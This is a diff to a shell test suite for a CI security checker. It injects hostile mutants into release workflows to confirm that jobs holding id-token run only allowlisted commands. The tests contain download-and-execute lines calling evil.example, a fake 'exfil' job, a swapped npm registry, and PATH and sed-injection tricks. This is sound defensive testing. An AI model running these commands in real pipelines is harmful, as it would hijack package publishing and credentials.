+		no "reports: $1" "the check could not read the mutated workflow: ${found}"
+		return
+	}
 	if [ -z "$found" ]; then
 		no "reports: $1" "the check passed a workflow with this hole"
 	elif [ -n "${6:-}" ] && ! grep -qF -- "$6" <<<"$found"; then
@@ -1242,7 +1832,7 @@ reach_case() {
 	if ! FROM="$3" TO="$copy" OLD="$4" NEW="$5" bun -e '
 const s = await Bun.file(process.env.FROM).text();
 if (!s.includes(process.env.OLD)) process.exit(2);
-await Bun.write(process.env.TO, s.replace(process.env.OLD, process.env.NEW));
+await Bun.write(process.env.TO, s.replace(process.env.OLD, () => process.env.NEW));
 '; then
 		no "reach mutant '$1' could be applied (the workflow no longer has the text it mutates)"
 		return
@@ -1352,7 +1942,7 @@ npm_pin_caught() {
 		if ! FROM="${WORK}/npmpin/$1" OLD="$2" NEW="$3" bun -e '
 const s = await Bun.file(process.env.FROM).text();
 if (!s.includes(process.env.OLD)) process.exit(2);
-await Bun.write(process.env.FROM, s.replace(process.env.OLD, process.env.NEW));
+await Bun.write(process.env.FROM, s.replace(process.env.OLD, () => process.env.NEW));
 '; then
 			no "npm pin mutant '${label}' could be applied ($1 no longer has the text it mutates)"
 			return
@@ -1595,7 +2185,7 @@ dockerfile_caught() {
 	if ! FROM="${HERE}/../../Dockerfile" TO="$copy" OLD="$2" NEW="$3" bun -e '
 const s = await Bun.file(process.env.FROM).text();
 if (!s.includes(process.env.OLD)) { console.error("anchor not found"); process.exit(2); }
-await Bun.write(process.env.TO, s.replace(process.env.OLD, process.env.NEW));
+await Bun.write(process.env.TO, s.replace(process.env.OLD, () => process.env.NEW));
 '; then
 		no "Dockerfile mutant '$1' could be applied (the Dockerfile no longer has the text it mutates)"
 		return
@@ -1687,7 +2277,7 @@ bun_pin_caught() {
 	if ! FROM="${WORK}/pins/$2" OLD="$3" NEW="$4" bun -e '
 const s = await Bun.file(process.env.FROM).text();
 if (!s.includes(process.env.OLD)) { console.error("anchor not found"); process.exit(2); }
-await Bun.write(process.env.FROM, s.replace(process.env.OLD, process.env.NEW));
+await Bun.write(process.env.FROM, s.replace(process.env.OLD, () => process.env.NEW));
 '; then
 		no "Bun pin mutant '$1' could be applied (the file no longer has the text it mutates)"
 		return
@@ -1901,7 +2491,7 @@ rm -rf "${WORK}/tagged-repo" && mkdir -p "${WORK}/tagged-repo/.github" && cp -R 
 if FROM="${WORK}/tagged-repo/.github/actions/bun-setup/action.yml" OLD='    - uses: oven-sh/setup-bun@' NEW='    - uses: oven-sh/setup-bun@v2 #' bun -e '
 const s = await Bun.file(process.env.FROM).text();
 if (!s.includes(process.env.OLD)) process.exit(2);
-await Bun.write(process.env.FROM, s.replace(process.env.OLD, process.env.NEW));
+await Bun.write(process.env.FROM, s.replace(process.env.OLD, () => process.env.NEW));
 '; then
 	REPO_DIR="${WORK}/tagged-repo" expect_caught 'a local composite action with tagged actions, used where authority is held' pinned "$WORKFLOWS/release.yml" \
 		'      - uses: oven-sh/setup-bun@' $'      - uses: ./.github/actions/bun-setup\n      - uses: oven-sh/setup-bun@' \
@@ -2464,6 +3054,155 @@ echo "no env in the job that installs npm and packs the brain tarball names code
 }
 
 echo
+echo "the npm publishing jobs, and every job holding id-token, run only the commands listed for them (#1029)"
+for f in "$WORKFLOWS"/*.yml; do
+	expect_clean "$(basename "$f"): every job holding id-token runs only its listed commands" runs "$f"
+done
+# Both jobs were read, or the list matched nothing and passed for that.
+for spec in "release-exec.yml publish-brain" "sidecar-release.yml publish-sidecar" "sidecar-release.yml sign-sidecar-windows" "installer-release.yml sign-windows"; do
+	read -r f j <<<"$spec"
+	if RUNS_REPORT=1 check runs "$WORKFLOWS/$f" | grep -qxF "checked $j"; then
+		ok "the run allowlist read ${j} in ${f} (#1029)"
+	else
+		no "the run allowlist read ${j} in ${f} (#1029)"
+	fi
+done
+# shellcheck disable=SC2016 # literal workflow text, not shell.
+{
+	# The probe from the issue, one reason at a time.
+	probe=$'      - run: curl -o /tmp/x https://evil.example/x; chmod +x /tmp/x; /tmp/x\n      - name: Publish to npm'
+	expect_caught 'a downloaded file run by its path in the brain publish job (#1029)' runs "$WORKFLOWS/release-exec.yml" \
+		'      - name: Publish to npm' "$probe" \
+		'publish-brain: step 4 runs /tmp/x, which is not a plain command name this rule can check'
+	expect_caught 'chmod in the brain publish job, which it never ran (#1029)' runs "$WORKFLOWS/release-exec.yml" \
+		'      - name: Publish to npm' "$probe" \
+		'publish-brain: step 4 runs chmod, which is not on the publish-brain list'
+	expect_caught 'a download that is not the pinned npm tarball (#1029)' runs "$WORKFLOWS/release-exec.yml" \
+		'      - name: Publish to npm' "$probe" \
+		'publish-brain: step 4 runs "curl -o /tmp/x https://evil.example/x", which is not one of the forms listed for curl'
+	# Without the pin on curl, the same attack needs no new command name.
+	expect_caught 'the pinned download pointed at the npm on PATH (#1029)' runs "$WORKFLOWS/release-exec.yml" \
+		'          if [ "$DRY_RUN" = "true" ]; then flags+=(--dry-run); fi' $'          curl -fsS --proto \x27=https\x27 --retry 3 --max-time 300 --max-filesize 67108864 -o /usr/local/bin/npm "https://registry.npmjs.org/npm/-/npm-${NPM_VERSION}.tgz"\n          if [ "$DRY_RUN" = "true" ]; then flags+=(--dry-run); fi' \
+		'not one of the forms listed for curl'
+	expect_caught 'a shell run on the download (#1029)' runs "$WORKFLOWS/release-exec.yml" \
+		'          if [ "$DRY_RUN" = "true" ]; then flags+=(--dry-run); fi' $'          bash /tmp/x\n          if [ "$DRY_RUN" = "true" ]; then flags+=(--dry-run); fi' \
+		'publish-brain: step Publish to npm runs bash, which is not on the publish-brain list'
+	expect_caught 'a command inside a substitution (#1029)' runs "$WORKFLOWS/release-exec.yml" \
+		'          if [ "$DRY_RUN" = "true" ]; then flags+=(--dry-run); fi' $'          x="$(sh -c id)"\n          if [ "$DRY_RUN" = "true" ]; then flags+=(--dry-run); fi' \
+		'publish-brain: step Publish to npm runs sh, which is not on the publish-brain list'
+	expect_caught 'a command inside a [[ ]] (#1029)' runs "$WORKFLOWS/release-exec.yml" \
+		'          if [ "$DRY_RUN" = "true" ]; then flags+=(--dry-run); fi' $'          [[ -n "$(sh -c id)" ]] || exit 1\n          if [ "$DRY_RUN" = "true" ]; then flags+=(--dry-run); fi' \
+		'publish-brain: step Publish to npm runs sh, which is not on the publish-brain list'
+	expect_caught 'a command after an ANSI-C quote that looks unclosed (#1029)' runs "$WORKFLOWS/release-exec.yml" \
+		'          if [ "$DRY_RUN" = "true" ]; then flags+=(--dry-run); fi' $'          echo $\x27\\\x27\x27; sh -c id #\x27\n          if [ "$DRY_RUN" = "true" ]; then flags+=(--dry-run); fi' \
+		'publish-brain: step Publish to npm runs sh, which is not on the publish-brain list'
+	expect_caught 'a command inside an array subscript (#1029)' runs "$WORKFLOWS/release-exec.yml" \
+		'          if [ "$DRY_RUN" = "true" ]; then flags+=(--dry-run); fi' $'          echo "${flags[$(sh -c id)]}"\n          if [ "$DRY_RUN" = "true" ]; then flags+=(--dry-run); fi' \
+		'publish-brain: step Publish to npm runs sh, which is not on the publish-brain list'
+	expect_caught 'eval in the brain publish job (#1029)' runs "$WORKFLOWS/release-exec.yml" \
+		'          if [ "$DRY_RUN" = "true" ]; then flags+=(--dry-run); fi' $'          eval "$x"\n          if [ "$DRY_RUN" = "true" ]; then flags+=(--dry-run); fi' \
+		'publish-brain: step Publish to npm runs eval, which is not on the publish-brain list'
+	expect_caught 'the digest check neutered by a function of the same name (#1029)' runs "$WORKFLOWS/release-exec.yml" \
+		'          echo "${SHA256}  ${RUNNER_TEMP}/brain-pack/${TARBALL}" | sha256sum -c -' $'          sha256sum() { :; }\n          echo "${SHA256}  ${RUNNER_TEMP}/brain-pack/${TARBALL}" | sha256sum -c -' \
+		'publish-brain: step Verify the tarball defines a function sha256sum over a command'
+	expect_caught 'a function not on the list (#1029)' runs "$WORKFLOWS/release-exec.yml" \
+		'          echo "${SHA256}  ${RUNNER_TEMP}/brain-pack/${TARBALL}" | sha256sum -c -' $'          f() { echo x; }\n          echo "${SHA256}  ${RUNNER_TEMP}/brain-pack/${TARBALL}" | sha256sum -c -' \
+		'publish-brain: step Verify the tarball defines a function f, which is not on the publish-brain list'
+	expect_caught 'a file written over by a redirection (#1029)' runs "$WORKFLOWS/release-exec.yml" \
+		'          if [ "$DRY_RUN" = "true" ]; then flags+=(--dry-run); fi' $'          echo x > /usr/local/bin/npm\n          if [ "$DRY_RUN" = "true" ]; then flags+=(--dry-run); fi' \
+		'publish-brain: step Publish to npm writes to /usr/local/bin/npm'
+	expect_caught 'a file written over by >& (#1029)' runs "$WORKFLOWS/release-exec.yml" \
+		'          if [ "$DRY_RUN" = "true" ]; then flags+=(--dry-run); fi' $'          echo x >&/usr/local/bin/npm\n          if [ "$DRY_RUN" = "true" ]; then flags+=(--dry-run); fi' \
+		'publish-brain: step Publish to npm writes to /usr/local/bin/npm'
+	expect_caught 'another registry slipped into the npm flags (#1029)' runs "$WORKFLOWS/release-exec.yml" \
+		'          if [ "$DRY_RUN" = "true" ]; then flags+=(--dry-run); fi' $'          if [ "$DRY_RUN" = "true" ]; then flags+=(--dry-run); fi\n          flags+=(--registry=https://registry.evil.example/)' \
+		'publish-brain: step Publish to npm sets the array flags=(--registry=https://registry.evil.example/), which is not on the publish-brain list'
+	expect_caught 'another registry in front of the publish (#1029)' runs "$WORKFLOWS/release-exec.yml" \
+		'          if ! npm publish "${RUNNER_TEMP}' '          if ! npm_config_registry=https://registry.evil.example/ npm publish "${RUNNER_TEMP}' \
+		'publish-brain: step Publish to npm runs npm with npm_config_registry=https://registry.evil.example/ in front'
+	expect_caught 'a heredoc, which the rule does not read (#1029)' runs "$WORKFLOWS/release-exec.yml" \
+		'          if [ "$DRY_RUN" = "true" ]; then flags+=(--dry-run); fi' $'          echo <<EOF\n          sh -c id\n          EOF\n          if [ "$DRY_RUN" = "true" ]; then flags+=(--dry-run); fi' \
+		'publish-brain: step Publish to npm holds a heredoc, which this rule does not read'
+	expect_caught 'an arithmetic command, which the rule does not read (#1029)' runs "$WORKFLOWS/release-exec.yml" \
+		'          if [ "$DRY_RUN" = "true" ]; then flags+=(--dry-run); fi' $'          (( x[$(id)] ))\n          if [ "$DRY_RUN" = "true" ]; then flags+=(--dry-run); fi' \
+		'publish-brain: step Publish to npm holds an arithmetic command, which this rule does not read'
+	expect_caught 'an integer test in [[ ]], which evaluates its operands (#1029)' runs "$WORKFLOWS/release-exec.yml" \
+		'          if [ "$DRY_RUN" = "true" ]; then flags+=(--dry-run); fi' $'          [[ \x27x[$(id)]\x27 -eq 0 ]] || exit 1\n          if [ "$DRY_RUN" = "true" ]; then flags+=(--dry-run); fi' \
+		'publish-brain: step Publish to npm holds an integer comparison inside [[ ]], which this rule does not read'
+	expect_caught 'the brain publish job renamed out of its list (#1029)' runs "$WORKFLOWS/release-exec.yml" \
+		$'  publish-brain:\n' $'  publish-brain-2:\n' \
+		'publish-brain-2: holds id-token and has no list of the commands it may run'
+	# publish-sidecar, which runs far more.
+	expect_caught 'a function of another step called where it is not defined (#1029)' runs "$WORKFLOWS/sidecar-release.yml" \
+		'          sums="$(cd artifacts' $'          manifest .\n          sums="$(cd artifacts' \
+		'publish-sidecar: step Record artifact digests calls manifest, a function this step does not define'
+	expect_caught 'printf -v, which assigns a variable unseen (#1029)' runs "$WORKFLOWS/sidecar-release.yml" \
+		'      - name: Record artifact digests' $'      - run: printf -v PATH %s /tmp/evil\n      - name: Record artifact digests' \
+		'runs printf -v, which sets a variable this rule cannot see'
+	expect_caught 'a directory outside sidecar/npm in the platform loop (#1029)' runs "$WORKFLOWS/sidecar-release.yml" \
+		'for platform in darwin-arm64 darwin-x64 linux-x64 linux-arm64 win32-x64; do' 'for platform in ../../../evil darwin-arm64 darwin-x64 linux-x64 linux-arm64 win32-x64; do' \
+		'publish-sidecar: step Prepare platform packages loops over platform in ../../../evil darwin-arm64'
+	expect_caught 'a command inside a for list (#1029)' runs "$WORKFLOWS/sidecar-release.yml" \
+		'for platform in darwin-arm64 darwin-x64 linux-x64 linux-arm64 win32-x64; do' 'for platform in $(sh -c id) darwin-arm64 darwin-x64 linux-x64 linux-arm64 win32-x64; do' \
+		'publish-sidecar: step Prepare platform packages runs sh, which is not on the publish-sidecar list'
+	expect_caught 'a command inside a case pattern (#1029)' runs "$WORKFLOWS/sidecar-release.yml" \
+		'              darwin-*)' '              darwin-*|$(sh -c id))' \
+		'publish-sidecar: step Prepare platform packages runs sh, which is not on the publish-sidecar list'
+	expect_caught 'tar told to run a program on what it extracts (#1029)' runs "$WORKFLOWS/sidecar-release.yml" \
+		'--no-same-owner --no-same-permissions' '--no-same-owner --no-same-permissions --to-command=sh' \
+		'which is not one of the forms listed for tar'
+	expect_caught 'sort told to run a compressor (#1029)' runs "$WORKFLOWS/sidecar-release.yml" \
+		'LC_ALL=C sort -z' 'LC_ALL=C sort -z --compress-program=/tmp/x' \
+		'publish-sidecar: step Record artifact digests runs "sort -z --compress-program=/tmp/x", which is not one of the forms listed for sort'
+	expect_caught 'a repository script run by its path in the sidecar publish job (#1029)' runs "$WORKFLOWS/sidecar-release.yml" \
+		'      - name: Record artifact digests' $'      - run: ./scripts/x.sh\n      - name: Record artifact digests' \
+		'runs ./scripts/x.sh, which is not a plain command name this rule can check'
+	# The list is exactly what the jobs run: an entry left behind is reported.
+	expect_caught 'a listed form no step runs any more (#1029)' runs "$WORKFLOWS/sidecar-release.yml" \
+		'xargs -0 -r sha256sum' 'xargs -0 sha256sum' \
+		'publish-sidecar: runAllow lists the form "xargs -0 -r sha256sum", which no step of the job runs any more'
+	# Security review of #1029: every job holding id-token, not only those
+	# that run npm publish, the signers included.
+	expect_caught 'an added id-token job that downloads and runs a file (security review of #1029)' runs "$WORKFLOWS/release-exec.yml" \
+		$'\njobs:\n' $'\njobs:\n  exfil:\n    runs-on: ubuntu-latest\n    permissions:\n      id-token: write\n    steps:\n      - run: curl -o /tmp/x https://evil.example/x; chmod +x /tmp/x; /tmp/x\n' \
+		'exfil: holds id-token and has no list of the commands it may run'
+	expect_caught 'a download run in the KMS signer of the sidecar (security review of #1029)' runs "$WORKFLOWS/sidecar-release.yml" \
+		'        run: scripts/sign-windows.sh --defer-verify "${SIDECAR_BIN}.exe"' '        run: curl -o /tmp/x https://evil.example/x; chmod +x /tmp/x; /tmp/x; scripts/sign-windows.sh --defer-verify "${SIDECAR_BIN}.exe"' \
+		'sign-sidecar-windows: step Sign Windows binary (Cloud KMS) runs /tmp/x, which is not a plain command name this rule can check'
+	expect_caught 'the signing script run with other arguments (security review of #1029)' runs "$WORKFLOWS/installer-release.yml" \
+		'        run: scripts/sign-windows.sh --defer-verify Jarvis-Setup.exe' '        run: scripts/sign-windows.sh --defer-verify /tmp/evil.exe' \
+		'which is not one of the forms listed for scripts/sign-windows.sh'
+	expect_caught 'a publish step in a shell the rule does not read (security review of #1029)' runs "$WORKFLOWS/release-exec.yml" \
+		$'      - name: Publish to npm\n        env:\n' $'      - name: Publish to npm\n        shell: python {0}\n        env:\n' \
+		'publish-brain: step Publish to npm runs in shell: python {0}, which this rule does not read'
+	# Review of #1029: values reach the pinned forms, so they are listed too.
+	expect_caught 'VERSION reassigned so the pinned sed -i runs a sed script of its own (review of #1029)' runs "$WORKFLOWS/sidecar-release.yml" \
+		'            sed -i "s|' $'            VERSION="1|e id|"\n            sed -i "s|' \
+		'publish-sidecar: step Prepare platform packages assigns "VERSION=\"1|e id|\"", which is not on the publish-sidecar list'
+	expect_caught 'a listed assignment changed (review of #1029)' runs "$WORKFLOWS/release-exec.yml" \
+		'          pkg="@usejarvis/brain"' '          pkg="@usejarvis/brain-evil"' \
+		'publish-brain: runAllow lists the assignment "pkg=\"@usejarvis/brain\"", which no step of the job runs any more'
+	expect_caught 'a listed function called on another directory (review of #1029)' runs "$WORKFLOWS/sidecar-release.yml" \
+		'            ours="$(manifest .)"' '            ours="$(manifest /)"' \
+		'publish-sidecar: step Publish platform packages calls "manifest /", which is not one of the calls listed'
+	expect_caught 'a nameref declared by local, so a later assignment writes PATH (review of #1029)' runs "$WORKFLOWS/sidecar-release.yml" \
+		'            local url integrity tmp got names types ours theirs' '            local -n url=PATH integrity tmp got names types ours theirs' \
+		'which is not one of the forms listed for local'
+	expect_caught 'mktemp making files where it is told (review of #1029)' runs "$WORKFLOWS/sidecar-release.yml" \
+		'          err="$(mktemp)"' '          err="$(mktemp -p /usr/local/bin)"' \
+		'publish-sidecar: step Publish platform packages runs "mktemp -p /usr/local/bin", which is not one of the forms listed for mktemp'
+	expect_caught 'diff told to run pr (review of #1029)' runs "$WORKFLOWS/sidecar-release.yml" \
+		"diff <(printf '%s\\n' \"\$want\")" "diff -l <(printf '%s\\n' \"\$want\")" \
+		'which is not one of the forms listed for diff'
+	expect_caught 'another publishing job, its publish on a continued line (review of #1029)' runs "$WORKFLOWS/release-exec.yml" \
+		$'\njobs:\n' $'\njobs:\n  sneak:\n    runs-on: ubuntu-latest\n    permissions:\n      id-token: write\n    steps:\n      - run: |\n          npm \\\n            publish x.tgz\n' \
+		'sneak: holds id-token and has no list of the commands it may run'
+	expect_caught 'another publishing job, npm quoted (review of #1029)' runs "$WORKFLOWS/release-exec.yml" \
+		$'\njobs:\n' $'\njobs:\n  sneak:\n    runs-on: ubuntu-latest\n    permissions:\n      id-token: write\n    steps:\n      - run: \x27"npm" publish x.tgz\x27\n' \
+		'sneak: holds id-token and has no list of the commands it may run'
+}
+
+echo
 echo "no checkout leaves a write token or a secret on disk, and a push brings its own credential (#982)"
 # shellcheck disable=SC2016 # literal workflow text, not shell.
 {
@@ -2669,7 +3408,7 @@ push_cred_caught() {
 	if ! FROM="$WORKFLOWS/release.yml" TO="$copy" OLD="$2" NEW="$3" bun -e '
 const s = await Bun.file(process.env.FROM).text();
 if (!s.includes(process.env.OLD)) { console.error("anchor not found"); process.exit(2); }
-await Bun.write(process.env.TO, s.replace(process.env.OLD, process.env.NEW));
+await Bun.write(process.env.TO, s.replace(process.env.OLD, () => process.env.NEW));
 '; then
 		no "push credential mutant '$1' could be applied (release.yml no longer has the text it mutates)"
 		return
@@ -2765,7 +3504,7 @@ copy="${WORK}/hidden.yml"
 if FROM="$WORKFLOWS/update-webview.yml" TO="$copy" OLD=$'          include-hidden-files: true\n' NEW='' bun -e '
 const s = await Bun.file(process.env.FROM).text();
 if (!s.includes(process.env.OLD)) process.exit(2);
-await Bun.write(process.env.TO, s.replace(process.env.OLD, process.env.NEW));
+await Bun.write(process.env.TO, s.replace(process.env.OLD, () => process.env.NEW));
 ' && grep -qF 'leaves hidden files out' <<<"$(hidden_check "$copy")"; then
 	ok "reports: the vendored tree uploaded without its hidden files (#983)"
 else
